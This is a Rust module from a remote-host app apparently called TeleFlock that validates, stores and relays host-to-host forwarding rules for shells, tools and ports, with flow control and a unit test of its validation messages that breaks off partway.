//! Host-to-host forwarding (architecture §5.2 "Forwarding"): the rules this device relays (saved
//! in `data_dir/forwards.json`, never on a host), their offers to each from-host, the relay of
//! every stream between the from-host's link and the to-host's link, the status of each rule, the
//! active streams, and `AppEvent::Forwards`.
//!
//! The relay holds no payload: each event is passed to the other link as it arrives, acks
//! included, so the to-host's and the caller's flow control holds end to end (`tf_proto::forward`).
//! A side that runs past its window is cut off.

use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use tf_proto::{
    ApiError, AppEvent, FWD_CHUNK, FWD_STREAMS, FWD_WINDOW, ForwardKind, ForwardList, ForwardRule, ForwardState, ForwardStatus, ForwardStream,
    FwdEv, FwdOffer, FwdOfferState, HostProfile, b64_len, is_windows_device_name,
};

use crate::engine::Inner;
use crate::link::Link;
use crate::util::{invalid, now_ms, rand_id, read_json, write_json};

/// Byte counters reach the UI at most this often.
const BYTES_EVERY: Duration = Duration::from_secs(2);
/// Longest stream label (characters).
const LABEL_MAX: usize = 200;
pub const NAME_MAX: usize = 32;
pub const TOOL_MAX: usize = 64;
/// The launcher's own name in `<home>/forward/bin` (tf-hostd): no tool may take it.
const LAUNCHER: &str = "tf-forward";

#[derive(serde::Serialize, serde::Deserialize, Default)]
struct RulesFile {
    rules: Vec<ForwardRule>,
}

/// The forwarding state of the app core (`Inner::forwards`).
pub(crate) struct Forwards {
    path: PathBuf,
    /// Serializes rule changes and `forwards.json` writes.
    io: tokio::sync::Mutex<()>,
    st: Mutex<St>,
}

#[derive(Default)]
struct St {
    rules: Vec<ForwardRule>,
    relays: HashMap<String, Relay>,
    /// (link id, sid) of either end → relay id. The from-host's ids are even, this app's odd.
    by_end: HashMap<(u64, u64), String>,
    /// Next odd stream id this app opens on a to-host link.
    next_sid: u64,
    next_stream: u64,
    /// Each from-host's answer to the last offer (`fwdOffered`), by host id.
    offered: HashMap<String, Vec<FwdOfferState>>,
    /// The offers last sent on each link (by link id), so only changes go out.
    sent: HashMap<u64, Vec<FwdOffer>>,
    /// Byte counters moved since the last `Forwards` event.
    bytes_dirty: bool,
}

/// One stream through this app: the from-host opened `from`, this app opened `to` for it.
struct Relay {
    info: ForwardStream,
    rule_name: String,
    /// Port streams: the listen port (the rule's change may drop it).
    listen: Option<u16>,
    target: Option<u16>,
    tool: Option<String>,
    from: End,
    to: End,
    flow: Flow,
}

/// What a relay passed each way and what came back acknowledged.
#[derive(Default)]
struct Flow {
    /// Bytes passed towards the to-host (up) / the from-host (down) that the receiver has not
    /// acknowledged yet.
    up_unacked: u64,
    down_unacked: u64,
    /// Port streams end once both directions saw `eof`.
    eof_up: bool,
    eof_down: bool,
}

impl Flow {
    /// Accounts an event passing up (from the from-host) or down. `Err` when it breaks the flow
    /// control: data past the receiver's window, or an ack of more than was passed towards its
    /// sender (a lie that would open the other side's window for data nobody consumed).
    fn pass(&mut self, up: bool, ev: &FwdEv) -> Result<(), &'static str> {
        match ev {
            FwdEv::Data { data, .. } => {
                let n = b64_len(data);
                if n > FWD_CHUNK as u64 {
                    return Err("the stream sent a data frame larger than 32 KiB");
                }
                let unacked = if up { &mut self.up_unacked } else { &mut self.down_unacked };
                *unacked += n;
                if *unacked > FWD_WINDOW {
                    return Err("the stream sent more than its flow-control window");
                }
            }
            // An ack from one side covers what was passed towards it.
            FwdEv::Ack { n } => {
                let unacked = if up { &mut self.down_unacked } else { &mut self.up_unacked };
                *unacked = unacked.checked_sub(*n).ok_or("the stream acknowledged more than it received")?;
            }
            FwdEv::Eof if up => self.eof_up = true,
            FwdEv::Eof => self.eof_down = true,
            _ => {}
        }
        Ok(())
    }
}

struct End {
    host: String,
    link: Arc<Link>,
    sid: u64,
}

impl Forwards {
    /// Loads `forwards.json` (an unreadable file is logged and starts empty, like `hosts.json`).
    pub async fn load(data_dir: &Path) -> Forwards {
        let path = data_dir.join("forwards.json");
        let rules = match read_json::<RulesFile>(&path).await {
            Ok(f) => f.unwrap_or_default().rules,
            Err(e) => {
                log::error!("{e}; starting with no forwards");
                Vec::new()
            }
        };
        Forwards { path, io: tokio::sync::Mutex::new(()), st: Mutex::new(St { rules, next_sid: 1, ..St::default() }) }
    }
}

/// Starts the byte counter ticker (`AppEvent::Forwards` at most every [`BYTES_EVERY`]).
pub(crate) fn start(inner: &Arc<Inner>) {
    let weak = Arc::downgrade(inner);
    tokio::spawn(async move {
        let mut tick = tokio::time::interval(BYTES_EVERY);
        tick.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);
        loop {
            tick.tick().await;
            let Some(inner) = weak.upgrade() else { break };
            let dirty = std::mem::take(&mut inner.forwards.st.lock().unwrap().bytes_dirty);
            if dirty {
                emit(&inner);
            }
        }
    });
}

// ───────────────────────────── list and events ─────────────────────────────

fn host_name(profiles: &[HostProfile], id: &str) -> String {
    profiles.iter().find(|p| p.id == id).map_or_else(|| id.to_string(), |p| p.name.clone())
}

/// Rules, their status and the active streams.
pub(crate) fn list(inner: &Inner) -> ForwardList {
    let profiles = inner.profiles();
    let st = inner.forwards.st.lock().unwrap();
    let status = st.rules.iter().map(|r| status_of(inner, &st, &profiles, r)).collect();
    let mut streams: Vec<ForwardStream> = st.relays.values().map(|r| r.info.clone()).collect();
    streams.sort_by(|a, b| a.started_at.cmp(&b.started_at).then_with(|| a.id.cmp(&b.id)));
    ForwardList { rules: st.rules.clone(), status, streams }
}

fn status_of(inner: &Inner, st: &St, profiles: &[HostProfile], rule: &ForwardRule) -> ForwardStatus {
    let status = |state, message: Option<String>| ForwardStatus { id: rule.id.clone(), state, message, port_errors: Vec::new() };
    if !rule.enabled {
        return status(ForwardState::Disabled, None);
    }
    let link = |id: &str| inner.host(id).and_then(|rt| rt.link());
    let (from, to) = (link(&rule.from_host), link(&rule.to_host));
    let name = |id: &str| host_name(profiles, id);
    let (from, to) = match (from, to) {
        (None, _) => return status(ForwardState::Waiting, Some(format!("{} is not connected", name(&rule.from_host)))),
        (_, None) => return status(ForwardState::Waiting, Some(format!("{} is not connected", name(&rule.to_host)))),
        (Some(f), Some(t)) => (f, t),
    };
    for (l, id) in [(&from, &rule.from_host), (&to, &rule.to_host)] {
        if !l.features.forward {
            return status(ForwardState::Unsupported, Some(format!("{} runs a tf-hostd older than 0.8.0 (it updates when TeleFlock reconnects)", name(id))));
        }
    }
    match st.offered.get(&rule.from_host).and_then(|all| all.iter().find(|s| s.name == rule.name)) {
        Some(s) if !s.active => status(ForwardState::Error, s.message.clone()),
        Some(s) => ForwardStatus { port_errors: s.port_errors.clone(), ..status(ForwardState::Ready, s.message.clone()) },
        None => status(ForwardState::Ready, None),
    }
}

/// Sends `AppEvent::Forwards` (in order with every other stateful event).
pub(crate) fn emit(inner: &Inner) {
    let _g = inner.emit_lock.lock().unwrap();
    let forwards = list(inner);
    inner.send(AppEvent::Forwards { forwards });
}

// ───────────────────────────── validation ─────────────────────────────

fn valid_name(s: &str) -> bool {
    let b = s.as_bytes();
    !b.is_empty()
        && b.len() <= NAME_MAX
        && (b[0].is_ascii_lowercase() || b[0].is_ascii_digit())
        && b.iter().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || *c == b'-')
}

/// A command name a shim can carry: `[A-Za-z0-9._+-]{1,64}`, not `.` or `..`.
pub fn valid_tool(s: &str) -> bool {
    !s.is_empty() && s.len() <= TOOL_MAX && s != "." && s != ".." && s.bytes().all(|c| c.is_ascii_alphanumeric() || b"._+-".contains(&c))
}

/// `forward.save` checks, the first failure in the editor's field order (`src/core/forward.ts`
/// runs the same ones): hosts, name, something to forward, tools, ports. `others`: the saved
/// rules apart from this one.
fn validate(rule: &ForwardRule, profiles: &[HostProfile], others: &[ForwardRule]) -> Result<(), ApiError> {
    let exists = |id: &str| profiles.iter().any(|p| p.id == id);
    let name = |id: &str| host_name(profiles, id);
    if !exists(&rule.from_host) {
        return Err(invalid(format!("fromHost: no host {}", rule.from_host)));
    }
    if !exists(&rule.to_host) {
        return Err(invalid(format!("toHost: no host {}", rule.to_host)));
    }
    if rule.to_host == rule.from_host {
        return Err(invalid("toHost: choose a host other than the one the forward is used from"));
    }
    let same_from: Vec<&ForwardRule> = others.iter().filter(|r| r.from_host == rule.from_host).collect();
    if !valid_name(&rule.name) {
        return Err(invalid(format!("name: use 1–{NAME_MAX} lowercase letters, digits or dashes, starting with a letter or digit")));
    }
    if same_from.iter().any(|r| r.name == rule.name) {
        return Err(invalid(format!("name: {} already has a forward called \"{}\"", name(&rule.from_host), rule.name)));
    }
    if !rule.shell && rule.tools.is_empty() && rule.ports.is_empty() {
        return Err(invalid("shell: turn on the shell, a tool or a port"));
    }
    for (i, tool) in rule.tools.iter().enumerate() {
        if !valid_tool(tool) {
            return Err(invalid(format!("tools: \"{tool}\" is not a command name (letters, digits, . _ + - only, up to {TOOL_MAX})")));
        }
        if tool == LAUNCHER {
            return Err(invalid(format!("tools: \"{LAUNCHER}\" is TeleFlock's own command")));
        }
        if is_windows_device_name(tool) {
            return Err(invalid(format!("tools: \"{tool}\" is a device name on Windows")));
        }
        if rule.tools[..i].contains(tool) {
            return Err(invalid(format!("tools: \"{tool}\" is listed twice")));
        }
        if let Some(other) = same_from.iter().find(|r| r.tools.contains(tool)) {
            return Err(invalid(format!("tools: {} already forwards \"{tool}\" in forward \"{}\"", name(&rule.from_host), other.name)));
        }
    }
    for (i, p) in rule.ports.iter().enumerate() {
        if p.listen == 0 || p.target == 0 {
            return Err(invalid("ports: port numbers are 1–65535"));
        }
        if rule.ports[..i].iter().any(|q| q.listen == p.listen) {
            return Err(invalid(format!("ports: {} is listed twice", p.listen)));
        }
        if let Some(other) = same_from.iter().find(|r| r.ports.iter().any(|q| q.listen == p.listen)) {
            return Err(invalid(format!("ports: {} already listens on {} in forward \"{}\"", name(&rule.from_host), p.listen, other.name)));
        }
    }
    Ok(())
}

// ───────────────────────────── app methods ─────────────────────────────

/// `forward.save`: create (`id` empty) or replace a rule. Streams the change no longer allows end.
pub(crate) async fn save(inner: &Arc<Inner>, mut rule: ForwardRule) -> Result<ForwardList, ApiError> {
    let fw = &inner.forwards;
    let _io = fw.io.lock().await;
    let profiles = inner.profiles();
    let next = {
        let st = fw.st.lock().unwrap();
        let others: Vec<ForwardRule> = st.rules.iter().filter(|r| r.id != rule.id || rule.id.is_empty()).cloned().collect();
        validate(&rule, &profiles, &others)?;
        if rule.id.is_empty() {
            rule.id = rand_id("fw_");
        }
        let mut next = st.rules.clone();
        match next.iter_mut().find(|r| r.id == rule.id) {
            Some(r) => *r = rule.clone(),
            None => next.push(rule.clone()),
        }
        next
    };
    write_json(&fw.path, &RulesFile { rules: next.clone() }).await?;
    let device = inner.device_name();
    let ended = {
        let mut st = fw.st.lock().unwrap();
        st.rules = next;
        let doomed: Vec<String> = st
            .relays
            .iter()
            .filter(|(_, r)| r.info.rule_id == rule.id && !allowed(r, &rule))
            .map(|(id, _)| id.clone())
            .collect();
        let why = if rule.enabled {
            format!("forward \"{}\" changed in TeleFlock on {device}", rule.name)
        } else {
            format!("forward \"{}\" was turned off in TeleFlock on {device}", rule.name)
        };
        take_relays(&mut st, &doomed).into_iter().map(|r| (r, why.clone())).collect::<Vec<_>>()
    };
    end_all(ended);
    refresh_offers(inner);
    emit(inner);
    Ok(list(inner))
}

/// Whether `rule` (as saved now) still allows what `r` runs.
fn allowed(r: &Relay, rule: &ForwardRule) -> bool {
    if !rule.enabled || rule.name != r.rule_name || rule.from_host != r.from.host || rule.to_host != r.to.host {
        return false;
    }
    match r.info.kind {
        ForwardKind::Command | ForwardKind::Shell => rule.shell,
        ForwardKind::Tool => r.tool.as_ref().is_some_and(|t| rule.tools.contains(t)),
        ForwardKind::Port => rule.ports.iter().any(|p| Some(p.listen) == r.listen && Some(p.target) == r.target),
        // Browser connections never run through a rule.
        ForwardKind::Browser => false,
    }
}

/// `forward.remove`: deletes the rule; its streams end.
pub(crate) async fn remove(inner: &Arc<Inner>, id: &str) -> Result<ForwardList, ApiError> {
    let fw = &inner.forwards;
    let _io = fw.io.lock().await;
    let (next, gone) = {
        let st = fw.st.lock().unwrap();
        let Some(gone) = st.rules.iter().find(|r| r.id == id).cloned() else {
            return Err(ApiError::new("not_found", format!("unknown forward `{id}`")));
        };
        (st.rules.iter().filter(|r| r.id != id).cloned().collect::<Vec<_>>(), gone)
    };
    write_json(&fw.path, &RulesFile { rules: next.clone() }).await?;
    let why = format!("forward \"{}\" was removed in TeleFlock on {}", gone.name, inner.device_name());
    let ended = {
        let mut st = fw.st.lock().unwrap();
        st.rules = next;
        let doomed: Vec<String> = st.relays.iter().filter(|(_, r)| r.info.rule_id == id).map(|(k, _)| k.clone()).collect();
        take_relays(&mut st, &doomed)
    };
    end_all(ended.into_iter().map(|r| (r, why.clone())).collect());
    refresh_offers(inner);
    emit(inner);
    Ok(list(inner))
}

/// `forward.stop`: ends one stream; the to-host kills what it runs.
pub(crate) fn stop(inner: &Arc<Inner>, stream_id: &str) -> Result<ForwardList, ApiError> {
    let ended = {
        let mut st = inner.forwards.st.lock().unwrap();
        if !st.relays.contains_key(stream_id) {
            return Err(ApiError::new("not_found", format!("unknown forward stream `{stream_id}`")));
        }
        take_relays(&mut st, &[stream_id.to_string()])
    };
    let why = format!("stopped from TeleFlock on {}", inner.device_name());
    end_all(ended.into_iter().map(|r| (r, why.clone())).collect());
    emit(inner);
    Ok(list(inner))
}

/// `hosts.remove`: rules that name the host go (their streams end).
pub(crate) async fn host_removed(inner: &Arc<Inner>, host_id: &str) {
    let fw = &inner.forwards;
    let _io = fw.io.lock().await;
    let next: Vec<ForwardRule> = {
        let mut st = fw.st.lock().unwrap();
        st.offered.remove(host_id);
        st.rules.iter().filter(|r| r.from_host != host_id && r.to_host != host_id).cloned().collect()
    };
    let changed = next.len() != fw.st.lock().unwrap().rules.len();
    if changed {
        if let Err(e) = write_json(&fw.path, &RulesFile { rules: next.clone() }).await {
            log::error!("forwards of removed host {host_id}: {}", e.message);
        }
        let ended = {
            let mut st = fw.st.lock().unwrap();
            let kept: Vec<String> = next.iter().map(|r| r.id.clone()).collect();
            st.rules = next;
            let doomed: Vec<String> = st.relays.iter().filter(|(_, r)| !kept.contains(&r.info.rule_id)).map(|(k, _)| k.clone()).collect();
            take_relays(&mut st, &doomed)
        };
        let why = format!("the host was removed from TeleFlock on {}", inner.device_name());
        end_all(ended.into_iter().map(|r| (r, why.clone())).collect());
    }
    refresh_offers(inner);
    emit(inner);
}

/// Host names may have changed (`hosts.save`): offers carry the to-host's name.
pub(crate) fn profiles_changed(inner: &Arc<Inner>) {
    refresh_offers(inner);
    emit(inner);
}

// ───────────────────────────── links ─────────────────────────────

/// A link to `host_id` came up: offers go out, statuses change; its streams end when it closes.
pub(crate) fn link_up(inner: &Arc<Inner>, host_id: &str, link: &Arc<Link>) {
    let (weak, host, l) = (Arc::downgrade(inner), host_id.to_string(), link.clone());
    tokio::spawn(async move {
        l.closed().await;
        if let Some(inner) = weak.upgrade() {
            link_down(&inner, &host, l.id);
        }
    });
    refresh_offers(inner);
    emit(inner);
}

fn link_down(inner: &Arc<Inner>, host_id: &str, link_id: u64) {
    let profiles = inner.profiles();
    let ended = {
        let mut st = inner.forwards.st.lock().unwrap();
        st.sent.remove(&link_id);
        // Its hostd forgot this app's offers with the connection.
        if inner.host(host_id).and_then(|rt| rt.link()).is_none_or(|l| l.id == link_id) {
            st.offered.remove(host_id);
        }
        let doomed: Vec<String> =
            st.relays.iter().filter(|(_, r)| r.from.link.id == link_id || r.to.link.id == link_id).map(|(k, _)| k.clone()).collect();
        take_relays(&mut st, &doomed)
    };
    for r in ended {
        if r.to.link.id == link_id {
            let why = format!("TeleFlock lost the connection to {}", host_name(&profiles, &r.to.host));
            let _ = r.from.link.fwd(r.from.sid, FwdEv::Close { error: Some(why) });
        } else {
            // The caller's host is gone: the to-host stops what it runs.
            let _ = r.to.link.fwd(r.to.sid, FwdEv::Close { error: Some(format!("{} disconnected", host_name(&profiles, &r.from.host))) });
        }
    }
    refresh_offers(inner);
    emit(inner);
}

/// The offers each from-host should hold now, sent where they changed.
fn refresh_offers(inner: &Arc<Inner>) {
    let profiles = inner.profiles();
    let device = inner.device_name();
    let mut st = inner.forwards.st.lock().unwrap();
    for p in &profiles {
        let Some(link) = inner.host(&p.id).and_then(|rt| rt.link()) else { continue };
        if !link.features.forward {
            continue;
        }
        let offers: Vec<FwdOffer> = st
            .rules
            .iter()
            .filter(|r| r.enabled && r.from_host == p.id && profiles.iter().any(|q| q.id == r.to_host))
            .map(|r| {
                let to = host_name(&profiles, &r.to_host);
                let reason = match inner.host(&r.to_host).and_then(|rt| rt.link()) {
                    None => Some(format!("{to} is not connected to TeleFlock on {device}")),
                    Some(l) if !l.features.forward => Some(format!("{to} runs TeleFlock older than 0.8.0 (it updates when TeleFlock on {device} reconnects to it)")),
                    Some(_) => None,
                };
                FwdOffer { name: r.name.clone(), to, shell: r.shell, tools: r.tools.clone(), ports: r.ports.clone(), ready: reason.is_none(), reason }
            })
            .collect();
        let unchanged = match st.sent.get(&link.id) {
            Some(prev) => *prev == offers,
            None => offers.is_empty(),
        };
        if unchanged {
            continue;
        }
        if offers.is_empty() {
            st.offered.remove(&p.id);
        }
        if link.fwd_offer(offers.clone()).is_ok() {
            st.sent.insert(link.id, offers);
        }
    }
}

/// `fwdOffered` from a from-host.
pub(crate) fn on_offered(inner: &Arc<Inner>, host_id: &str, states: Vec<FwdOfferState>) {
    let changed = {
        let mut st = inner.forwards.st.lock().unwrap();
        st.offered.insert(host_id.to_string(), states.clone()) != Some(states)
    };
    if changed {
        emit(inner);
    }
}

// ───────────────────────────── streams ─────────────────────────────

/// A `fwd` event from `host_id`'s link: an open from the from-host, or an event of a relayed stream.
pub(crate) fn on_fwd(inner: &Arc<Inner>, host_id: &str, link: &Arc<Link>, sid: u64, ev: FwdEv) {
    if sid.is_multiple_of(2) && matches!(ev, FwdEv::Open { .. }) {
        open(inner, host_id, link, sid, ev);
        return;
    }
    enum Next {
        /// Pass the event on (`done`: the stream is over).
        Pass(Arc<Link>, u64, bool),
        /// The event broke the flow control: the relay, taken out of the tables, and why.
        Cut(Vec<Relay>, &'static str),
        Unknown,
    }
    let (data, is_final) = (matches!(ev, FwdEv::Data { .. }), ev.is_final());
    let next = {
        let mut st = inner.forwards.st.lock().unwrap();
        match st.by_end.get(&(link.id, sid)).cloned() {
            None => Next::Unknown,
            Some(id) => {
                let Some(r) = st.relays.get_mut(&id) else { return };
                let up = r.from.link.id == link.id && r.from.sid == sid;
                if let FwdEv::Data { data, .. } = &ev {
                    let n = b64_len(data);
                    if up {
                        r.info.bytes_up += n;
                    } else {
                        r.info.bytes_down += n;
                    }
                }
                let broken = r.flow.pass(up, &ev).err();
                let done = is_final || (r.info.kind == ForwardKind::Port && r.flow.eof_up && r.flow.eof_down);
                let to = if up { &r.to } else { &r.from };
                let (to_link, to_sid) = (to.link.clone(), to.sid);
                st.bytes_dirty |= data;
                match broken {
                    Some(why) => Next::Cut(take_relays(&mut st, &[id]), why),
                    None => {
                        if done {
                            take_relays(&mut st, &[id]);
                        }
                        Next::Pass(to_link, to_sid, done)
                    }
                }
            }
        }
    };
    match next {
        Next::Pass(l, s, done) => {
            let _ = l.fwd(s, ev);
            if done {
                emit(inner);
            }
        }
        Next::Cut(taken, why) => {
            end_all(taken.into_iter().map(|r| (r, why.to_string())).collect());
            emit(inner);
        }
        // A stream this app no longer relays: the from-host's caller learns it is over.
        Next::Unknown if sid.is_multiple_of(2) && !is_final && !matches!(ev, FwdEv::Ack { .. }) => {
            let _ = link.fwd(sid, FwdEv::Close { error: Some("this forwarded stream is no longer relayed".into()) });
        }
        // A to-host stream this app does not relay (its relay ended as the open went out): what
        // runs there stops.
        Next::Unknown if !is_final && !matches!(ev, FwdEv::Ack { .. }) => {
            let _ = link.fwd(sid, FwdEv::Close { error: None });
        }
        Next::Unknown => {}
    }
}

/// The from-host opens stream `sid` for rule `name`: checked against the saved rule, then opened
/// on the to-host (or refused to the caller with the reason). The check, the relay's entry and
/// the open towards the to-host happen under one lock: a rule turned off or removed, or a stop,
/// either comes first (and refuses this open) or ends the relay after its open went out.
fn open(inner: &Arc<Inner>, from_host: &str, from_link: &Arc<Link>, sid: u64, ev: FwdEv) {
    let FwdEv::Open { kind, name, command, argv, pty, cwd, port } = ev else { return };
    let device = inner.device_name();
    let profiles = inner.profiles();
    let admitted: Result<(String, String), String> = 'admit: {
        let mut st = inner.forwards.st.lock().unwrap();
        let Some(rule) = st.rules.iter().find(|r| r.from_host == from_host && r.name == name).cloned() else {
            break 'admit Err(format!("no forward called \"{name}\" in TeleFlock on {device}"));
        };
        if !rule.enabled {
            break 'admit Err(format!("forward \"{name}\" is turned off in TeleFlock on {device}"));
        }
        let to_name = host_name(&profiles, &rule.to_host);
        let (mut tool, mut listen, mut target) = (None, None, None);
        let label = match kind {
            ForwardKind::Command | ForwardKind::Shell if !rule.shell => {
                break 'admit Err(format!("forward \"{name}\" runs no commands or shells, only its tools and ports"));
            }
            ForwardKind::Command => match command.as_deref().map(str::trim).filter(|c| !c.is_empty()) {
                Some(c) => c.to_string(),
                None => break 'admit Err("a command stream needs a command".into()),
            },
            ForwardKind::Shell => "login shell".to_string(),
            ForwardKind::Tool => {
                let t = argv.as_ref().and_then(|a| a.first()).cloned().unwrap_or_default();
                if !rule.tools.contains(&t) {
                    break 'admit Err(format!("forward \"{name}\" does not forward the tool \"{t}\""));
                }
                tool = Some(t);
                argv.as_deref().unwrap_or_default().join(" ")
            }
            // A host opens browser connections towards the app that lends its browser, never
            // through a forward.
            ForwardKind::Browser => break 'admit Err("this TeleFlock app does not lend its browser".into()),
            ForwardKind::Port => {
                let Some(p) = port.and_then(|l| rule.ports.iter().find(|p| p.listen == l)) else {
                    break 'admit Err(format!("forward \"{name}\" does not forward port {}", port.unwrap_or_default()));
                };
                (listen, target) = (Some(p.listen), Some(p.target));
                format!("127.0.0.1:{} → {}", p.listen, p.target)
            }
        };
        let Some(to_link) = inner.host(&rule.to_host).and_then(|rt| rt.link()) else {
            break 'admit Err(format!("{to_name} is not connected to TeleFlock on {device}"));
        };
        if !to_link.features.forward {
            break 'admit Err(format!("{to_name} runs a tf-hostd older than 0.8.0 (it updates when TeleFlock reconnects to it)"));
        }
        // A from-host never reuses the id of a stream that still runs: the relay it has stays.
        if st.by_end.contains_key(&(from_link.id, sid)) {
            break 'admit Err(format!("stream {sid} is open already"));
        }
        if st.relays.values().filter(|r| r.info.rule_id == rule.id).count() >= FWD_STREAMS {
            break 'admit Err(format!("forward \"{name}\" already has {FWD_STREAMS} streams open"));
        }
        let label = label_text(&label);
        let to_sid = st.next_sid | 1;
        st.next_sid = to_sid + 2;
        st.next_stream += 1;
        let id = format!("fs{}", st.next_stream);
        st.by_end.insert((from_link.id, sid), id.clone());
        st.by_end.insert((to_link.id, to_sid), id.clone());
        st.relays.insert(
            id.clone(),
            Relay {
                info: ForwardStream { id: id.clone(), rule_id: rule.id.clone(), kind, label, started_at: now_ms(), bytes_up: 0, bytes_down: 0 },
                rule_name: rule.name.clone(),
                listen,
                target,
                tool,
                from: End { host: from_host.to_string(), link: from_link.clone(), sid },
                to: End { host: rule.to_host.clone(), link: to_link.clone(), sid: to_sid },
                flow: Flow::default(),
            },
        );
        // Each kind passes only its own fields. A tool runs in the from-host's directory only when
        // the rule lets it run commands anyway (else in the home, as its shims do).
        let (command, argv, cwd, pty) = match kind {
            ForwardKind::Command => (command, None, cwd, pty),
            ForwardKind::Shell => (None, None, cwd, pty),
            ForwardKind::Tool => (None, argv, cwd.filter(|_| rule.shell), pty),
            ForwardKind::Port | ForwardKind::Browser => (None, None, None, None),
        };
        if to_link.fwd(to_sid, FwdEv::Open { kind, name: name.clone(), command, argv, pty, cwd, port: target }).is_err() {
            take_relays(&mut st, &[id]);
            break 'admit Err(format!("{to_name} is not connected to TeleFlock on {device}"));
        }
        Ok((id, rule.to_host))
    };
    match admitted {
        Ok((id, to_host)) => {
            log::info!("forward {name}: stream {id} {from_host} → {to_host} ({kind:?})");
            emit(inner);
        }
        Err(why) => {
            log::info!("forward {name} from {from_host}: refused ({why})");
            let _ = from_link.fwd(sid, FwdEv::Close { error: Some(why) });
        }
    }
}

/// A stream's label as the UI shows it: whitespace runs as one space, without control or
/// bidirectional formatting characters (they could hide part of a command line), at most
/// [`LABEL_MAX`] characters.
fn label_text(raw: &str) -> String {
    let shown: String =
        raw.chars().filter(|c| c.is_whitespace() || !(c.is_control() || matches!(c, '\u{061C}' | '\u{200E}' | '\u{200F}' | '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}'))).collect();
    let label = shown.split_whitespace().collect::<Vec<_>>().join(" ");
    if label.chars().count() > LABEL_MAX { label.chars().take(LABEL_MAX - 1).chain(['…']).collect() } else { label }
}

/// Removes relays from the tables (their ends are told by [`end_all`]).
fn take_relays(st: &mut St, ids: &[String]) -> Vec<Relay> {
    let mut out = Vec::new();
    for id in ids {
        if let Some(r) = st.relays.remove(id) {
            st.by_end.remove(&(r.from.link.id, r.from.sid));
            st.by_end.remove(&(r.to.link.id, r.to.sid));
            out.push(r);
        }
    }
    out
}

/// Ends taken relays: the caller gets `why`, the to-host stops what it runs.
fn end_all(ended: Vec<(Relay, String)>) {
    for (r, why) in ended {
        log::info!("forward {}: stream {} ended: {why}", r.rule_name, r.info.id);
        let _ = r.to.link.fwd(r.to.sid, FwdEv::Close { error: Some(why.clone()) });
        let _ = r.from.link.fwd(r.from.sid, FwdEv::Close { error: Some(why) });
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tf_proto::{ForwardPort, HostKind};

    fn host(id: &str, name: &str) -> HostProfile {
        HostProfile {
            id: id.into(),
            name: name.into(),
            kind: HostKind::TailscaleSsh,
            address: Some("x".into()),
            user: None,
            port: None,
            auth: None,
            key_path: None,
            distro: None,
            herdr_session: "default".into(),
            color: None,
            auto_connect: false,
            relay_port: None,
            group: None,
        }
    }

    fn rule(over: impl FnOnce(&mut ForwardRule)) -> ForwardRule {
        let mut r = ForwardRule {
            id: String::new(),
            from_host: "dev".into(),
            to_host: "mac".into(),
            name: "mac".into(),
            enabled: true,
            shell: true,
            tools: vec![],
            ports: vec![],
        };
        over(&mut r);
        r
    }

    fn check(r: ForwardRule, others: &[ForwardRule]) -> Result<(), String> {
        let hosts = [host("dev", "dev box"), host("mac", "Studio Mac"), host("pc", "pc")];
        validate(&r, &hosts, others).map_err(|e| {
            assert_eq!(e.code, "invalid_params");
            e.message
        })
    }

    /// The same cases as `src/core/forward.test.ts`: the editor and the core agree on every message.
    #[test]
    fn validation_matches_the_editor() {
        let port = |listen, target| ForwardPort { listen, target };
        assert_eq!(check(rule(|r| (r.tools, r.ports) = (vec!["agent-browser".into()], vec![port(9222, 9222)])), &[]), Ok(()));
        assert_eq!(check(rule(|r| r.from_host = "gone".into()), &[]).unwrap_err(), "fromHost: no host gone");
        assert_eq!(check(rule(|r| r.to_host = "gone".into()), &[]).unwrap_err(), "toHost: no host gone");
        assert_eq!(check(rule(|r| r.to_host = "dev".into()), &[]).unwrap_err(), "toHost: choose a host other than the one the forward is used from");
        assert!(check(rule(|r| r.name = "Mac".into()), &[]).unwrap_err().starts_with("name: use 1–32 lowercase letters"));
        assert!(check(rule(|r| r.name = "-mac".into()), &[]).is_err());
        assert!(check(rule(|r| r.name = "m".repeat(33)), &[]).is_err());
        assert_eq!(check(rule(|r| r.name = "9-lives".into()), &[]), Ok(()));
        let other = rule(|r| r.id = "r1".into());
        assert_eq!(check(rule(|_| {}), std::slice::from_ref(&other)).unwrap_err(), "name: dev box already has a forward called \"mac\"");
        assert_eq!(check(rule(|r| r.from_host = "pc".into()), &[other]), Ok(()));
        assert_eq!(check(rule(|r| r.shell = false), &[]).unwrap_err(), "shell: turn on the shell, a tool or a port");
        assert_eq!(check(rule(|r| (r.shell, r.tools) = (false, vec!["adb".into()])), &[]), Ok(()));
        assert_eq!(
            check(rule(|r| r.tools = vec!["ok".into(), "no way".into()]), &[]).unwrap_err(),
            "tools: \"no way\" is not a command name (letters, digits, . _ + - only, up to 64)"
        );
        assert_eq!(check(rule(|r| r.tools = vec!["a".into(), "a".into()]), &[]).unwrap_err(), "tools: \"a\" is listed twice");
        assert!(check(rule(|r| r.tools = vec!["x".repeat(65)]), &[]).is_err());
        assert_eq!(check(rule(|r| r.tools = vec!["tf-forward".into()]), &[]).unwrap_err(), "tools: \"tf-forward\" is TeleFlock's own command");
        assert_eq!(check(rule(|r| r.tools = vec!["Con.cmd".into()]), &[]).unwrap_err(), "tools: \"Con.cmd\" is a device name on Windows");
        assert_eq!(check(rule(|r| r.tools = vec!["..".into()]), &[]).unwrap_err(), "tools: \"..\" is not a command name (letters, digits, . _ + - only, up to 64)");
        let browser = rule(|r| (r.id, r.name, r.to_host, r.tools) = ("r2".into(), "pc".into(), "pc".into(), vec!["agent-browser".into()]));
        assert_eq!(
            check(rule(|r| r.tools = vec!["agent-browser".into()]), std::slice::from_ref(&browser)).unwrap_err(),
            "tools: dev box already forwards \"agent-browser\" in forward \"pc\""
        );
        assert_eq!(check(rule(|r| (r.from_host, r.to_host, r.tools) = ("pc".into(), "dev".into(), vec!["agent-browser".into()])), &[browser]), Ok(()));
        assert_eq!(check(rule(|r| r.ports = vec![port(0, 80)]), &[]).unwrap_err(), "ports: port numbers are 1–65535");
        assert_eq!(check(rule(|r| r.ports = vec![port(80, 0)]), &[]).unwrap_err(), "ports: port numbers are 1–65535");
        assert_eq!(check(rule(|r| r.ports = vec![port(80, 1), port(80, 2)]), &[]).unwrap_err(), "ports: 80 is listed twice");
